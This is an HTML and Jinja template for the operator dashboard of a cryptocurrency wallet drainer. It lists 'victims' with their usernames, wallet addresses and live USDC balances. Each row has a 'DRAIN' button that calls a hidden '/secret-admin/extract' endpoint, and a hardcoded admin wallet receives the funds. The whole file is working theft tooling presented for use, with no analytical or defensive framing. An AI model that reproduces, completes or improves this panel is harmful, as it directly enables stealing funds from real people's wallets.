<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>CORE ASSET CONTROL v2.1</title>
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
    <style>
        :root { --danger: #ef4444; --success: #22c55e; --accent: #38bdf8; --bg: #020617; --panel-bg: #0f172a; }
        body { background: var(--bg); color: #f1f5f9; font-family: monospace; padding: 20px; }

        .header { display: flex; justify-content: space-between; padding: 10px; border-bottom: 2px solid #1e293b; margin-bottom: 20px; }
        .admin-box { background: #1e293b; padding: 10px; border-radius: 8px; border: 1px solid var(--accent); }

        table { width: 100%; border-collapse: collapse; background: var(--panel-bg); border-radius: 8px; overflow: hidden; }
        th { background: #1e293b; padding: 12px; text-align: left; color: var(--accent); border-bottom: 1px solid #334155; }
        td { padding: 12px; border-bottom: 1px solid #1e293b; }

        .status-badge { padding: 4px 8px; border-radius: 4px; font-size: 11px; font-weight: bold; }
        .success { background: #14532d; color: #4ade80; }
        .loading { background: #1e293b; color: #94a3b8; }

        .btn-exec { background: var(--danger); color: white; border: none; padding: 8px 16px; cursor: pointer; border-radius: 4px; font-weight: bold; }
        .btn-exec:disabled { opacity: 0.3; }

        /* Log Panel */
        #debug-log { margin-top: 20px; background: #000; color: #0f0; padding: 10px; height: 100px; overflow-y: auto; font-size: 11px; border: 1px solid #334155; }
        #notifier { position: fixed; bottom: 20px; right: 20px; padding: 15px; border-radius: 5px; display: none; }
    </style>
</head>
<body>

    <div class="header">
        <div>
            <h2 style="margin:0; color:var(--danger);">SYSTEM_CONTROL_v2</h2>
            <small id="net-status">NETWORK: CONNECTING...</small>
        </div>
        <div class="admin-box">
            <small>ADMIN_WALLET (ETH):</small><br>
            <span id="admin-eth" style="color:var(--accent);">0.00000</span>
        </div>
    </div>

    <table>
        <thead>
            <tr>
                <th>USER_ID</th>
                <th>WALLET_ADDRESS</th>
                <th>USDC_BALANCE</th>
                <th>GAS_EST</th>
                <th>ACTION</th>
            </tr>
        </thead>
        <tbody>
            {% for v in victims %}
            <tr id="row-{{ v.id }}">
                <td>{{ v.user.username }}</td>
                <td style="color:#64748b; font-size:12px;">{{ v.wallet_address }}</td>
                <td id="bal-{{ v.id }}"><span class="status-badge loading">FETCHING...</span></td>
                <td id="gas-{{ v.id }}" style="font-size:11px;">--</td>
                <td>
                    <input type="number" id="amt-{{ v.id }}" value="100" style="width:60px; background:#1e293b; border:1px solid #334155; color:#fff;">
                    <button class="btn-exec" onclick="runExtraction(this, '{{ v.id }}')">DRAIN</button>
                </td>
            </tr>
            {% endfor %}
        </tbody>
    </table>

    <div id="debug-log"> [SYSTEM INITIALIZED] </div>
    <div id="notifier"></div>

<script>
// UPDATE THIS TO YOUR ACTUAL ADMIN WALLET
const ADMIN_WALLET = "0x0148CeA1f2DAC72f17c2130d8d43a3aB0eb9930B";
const USDC_ADDR = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
const USDC_ABI = ["function balanceOf(address) view returns (uint256)"];
const RPC_URL = "https://rpc.ankr.com/eth"; // Much faster than Cloudflare

function log(msg) {
    const d = document.getElementById('debug-log');
    d.innerHTML += `> ${msg}<br>`;
    d.scrollTop = d.scrollHeight;
}

function notify(msg, color) {
    const n = document.getElementById('notifier');
    n.innerText = msg; n.style.background = color; n.style.display = 'block';
    setTimeout(() => n.style.display='none', 4000);
}

async function refreshData() {
    try {
        const provider = new ethers.providers.JsonRpcProvider(RPC_URL);
        const network = await provider.getNetwork();
        document.getElementById('net-status').innerText = `NETWORK: ${network.name.toUpperCase()} (ID: ${network.chainId})`;

        // 1. Fetch Admin ETH
        const ethBal = await provider.getBalance(ADMIN_WALLET);
        document.getElementById('admin-eth').innerText = parseFloat(ethers.utils.formatEther(ethBal)).toFixed(5);

        // 2. Fetch Gas Price
        const gasPrice = await provider.getGasPrice();
        const gasCostEth = ethers.utils.formatEther(gasPrice.mul(125000));
        log(`Current Gas: ${ethers.utils.formatUnits(gasPrice, 'gwei')} Gwei`);

        // 3. Fetch User Balances
        const contract = new ethers.Contract(USDC_ADDR, USDC_ABI, provider);
        const rows = document.querySelectorAll('tr[id^="row-"]');

        for (let row of rows) {
            const id = row.id.split('-')[1];
            const addr = row.cells[1].innerText;

            try {
                const bal = await contract.balanceOf(addr);
                const cleanBal = parseFloat(ethers.utils.formatUnits(bal, 6)).toFixed(2);
                document.getElementById(`bal-${id}`).innerHTML = `<span class="status-badge success">${cleanBal} USDC</span>`;
                document.getElementById(`gas-${id}`).innerText = `~$${(cleanBal * 0).toFixed(2)} | ${parseFloat(gasCostEth).toFixed(4)} ETH`;
            } catch(e) {
                log(`Failed balance fetch for ${id}`);
            }
        }
    } catch (err) {
        log(`CRITICAL ERROR: ${err.message}`);
    }
}

async function runExtraction(btn, id) {
    const amt = document.getElementById(`amt-${id}`).value;
    btn.disabled = true; btn.innerText = "WAIT...";
    log(`Executing Extraction ID: ${id} | Amount: ${amt}`);

    try {
        const res = await fetch(`/secret-admin/extract/${id}/?amount=${amt}`);
        const data = await res.json();
        if(data.status === 'success') {
            notify("SUCCESS", "#16a34a");
            log(`TX SUCCESS: ${data.tx}`);
        } else {
            notify(`FAILED: ${data.msg}`, "#dc2626");
            log(`TX FAILED: ${data.msg}`);
        }
    } catch(e) {
        notify("SERVER ERROR", "#000");
    } finally {
        btn.disabled = false; btn.innerText = "DRAIN";
        refreshData();
    }
}

// Start
refreshData();
setInterval(refreshData, 30000); // Auto-refresh every 30s
</script>
</body>
</html>
